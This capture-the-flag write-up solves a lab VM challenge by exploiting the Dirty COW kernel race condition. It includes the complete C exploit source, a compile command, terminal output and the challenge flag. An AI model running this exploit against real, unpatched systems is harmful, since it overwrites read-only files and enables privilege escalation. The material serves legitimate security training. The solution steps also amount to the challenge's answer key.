
## Challenge Information

Link: https://www.dropbox.com/scl/fi/1v60vz7iz15tqj82v1av5/CVE-Complete.ova?rlkey=3kgz9b7iw7dusjx6pozv8nnyb&st=8h1vv6oh&dl=0

Difficulty: Easy

Category: Exploit Vulnerability

Author: Jake Bailey

Description:

```
This CTF requires players to alter a read-only file to obtain a key from an executable provided to the player on the challenge machine
```

Hints:
- Man, this kernel version is OLD
- I'm deathly afraid of farm animals

Login as "tester" user with "123456" as the password

## Solution

1.  Run the key_checker executable to see that some file content must be modified to obtain the key
```
tester@CVE:~$ ./key_checker
Incorrect file content. Boo
```
2. Look at the 'flagfile' file and note its contents 
3. Create a program that exploits the DirtyCOW vulnerability and use the program to overwrite the contents of 'flagfile', changing 'no' to 'yes'.
```
tester@CVE:~$ cat checkflag
no
tester@CVE:~$ ./dirtycow flagfile yes
mmap b779f000

procselfmem 3000000

madvise 0

tester@CVE:~$ cat flagfile
yestester@CVE:~$ ./key_checker
m00000000(You found the key!)
tester@CVE:~$
```

Here is the exploit I used to solve 
```
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map; //Memory Mapping
int f; //file descriptor for target file
struct stat st; //file information
char *name; //name of target file

/*
On this thread, we use madvise, which is an optimization
call for handling memory. We call madvise with the DONTNEED flag,
which causes subsequent accesses to the specified memory range be
reloaded each time they are accessed
*/
void *madviseThread(void *arg){
	char *str;
	str=(char*)arg;
	int i,c=0;
	for(i = 0; i < 1000000; i++){
		c += madvise(map, 100, MADV_DONTNEED);
	}
	printf("madvise %d\n\n", c);
}

/*
This thread opens the proc/self/mem file, which contains the
memory for the current process. We seek the beginning of this
file, and then write the passed string to it. The kernel should
make a copy of the file and then write to that (COW), although
when the race condition with madvise is introduced, the underlying
file will be written to, rather than a copy. 
*/

void *procselfmemThread(void *arg){
	char *str;
	str=(char*)arg;
	int f = open("/proc/self/mem", O_RDWR);
	int i,c = 0;
	for(i = 0; i < 1000000; i++){
		lseek(f,(uintptr_t) map, SEEK_SET);
		c += write(f,str,strlen(str));
	}
	printf("procselfmem %d \n\n", c);
}


int main(int argc, char *argv[]){
	if(argc < 3){
		(void)fprintf(stderr," %s\n", "usage: exploit target_file new_content");
		return 1;
	}
	pthread_t pth1, pth2;
	f = open(argv[1], O_RDONLY); //open target file as read only
	fstat(f, &st);
	name = argv[1];
	//open with MAP_PRIVATE to enable COW mapping
	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE,f,0); 
	printf("mmap %zx\n\n", (uintptr_t) map);

	pthread_create(&pth1, NULL, madviseThread, argv[1]);
	pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}
```
compilation: gcc -pthread exploit.c -o exploit

Flag: m00000000(You found the key!)
